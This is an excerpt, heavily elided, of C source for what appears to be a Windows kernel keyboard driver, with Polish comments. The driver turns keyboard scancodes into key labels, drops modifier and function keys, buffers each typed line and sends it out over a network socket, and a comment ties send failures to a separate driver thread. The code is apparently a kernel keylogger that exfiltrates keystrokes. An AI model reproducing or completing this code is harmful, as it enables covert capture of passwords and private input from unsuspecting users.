...
static PVOID g_NetworkBuffer = NULL; // Bufor NonPagedPool
...
static const UCHAR g_E0Scancodes[18][12] = {
    "[RCt]", "[KP/]", "[Prt]", "[RAl]", "[Hom]", "[Up]", "[PgU]", "[Lft]", "[Rgt]", "[End]", 
...
#define IS_MODIFIER(str) ((str)[0] == '[' && (str)[1] != 'K' && (str)[1] != 'E' && (str)[1] != 'B' && (str)[1] != 'T') // Uproszczone
...
VOID KbdHandler_SendBufferedLine(VOID) {
    ...
    if (LocalPosition > 0) {
        ...
        if (LocalSocket != 0) {
            ...
            // --- TU JEST KLUCZ DO USYPIANIA I WYLOGOWYWANIA ---
            // Jeśli wysłanie się nie uda (bo sieć padła), dajemy znać wątkowi w driver.c
...
BOOLEAN KbdHandler_AddToLineBuffer(_In_ PCUCHAR KeyString) {
    ...
    // Ignoruj modyfikatory (Shift, Ctrl itp.) w logu, chyba że chcesz je widzieć
    if (IS_MODIFIER(KeyString)) return FALSE; 
    if (KeyString[0] == 'F' && (KeyString[1] >= '1' && KeyString[1] <= '9')) return FALSE;
...
VOID KbdHandler_ProcessScanCode(_In_ PKEYBOARD_INPUT_DATA InputData) {
    ...
    if (FlagOn(InputData->Flags, KEY_E0)) {
        switch (MakeCode) {
            case 0x1D: KeyString = g_E0Scancodes[0]; break; case 0x35: KeyString = g_E0Scancodes[1]; break;
            case 0x37: KeyString = g_E0Scancodes[2]; break; case 0x38: KeyString = g_E0Scancodes[3]; break;
            case 0x47: KeyString = g_E0Scancodes[4]; break; case 0x48: KeyString = g_E0Scancodes[5]; break;
            case 0x49: KeyString = g_E0Scancodes[6]; break; case 0x4B: KeyString = g_E0Scancodes[7]; break;
            case 0x4D: KeyString = g_E0Scancodes[8]; break; case 0x4F: KeyString = g_E0Scancodes[9]; break;
            case 0x50: KeyString = g_E0Scancodes[10]; break; case 0x51: KeyString = g_E0Scancodes[11]; break;
            case 0x52: KeyString = g_E0Scancodes[12]; break; case 0x53: KeyString = g_E0Scancodes[13]; break;
            case 0x5B: KeyString = g_E0Scancodes[14]; break; case 0x5C: KeyString = g_E0Scancodes[15]; break;
            case 0x5D: KeyString = g_E0Scancodes[16]; break; default:   KeyString = g_E0Scancodes[17]; break;
        }
        if (MakeCode == SC_E0_RALT) g_RightAltPressed = IsKeyPress;
...
OutputKey:
    if (IsKeyPress) KbdHandler_AddToLineBuffer(KeyString);
}
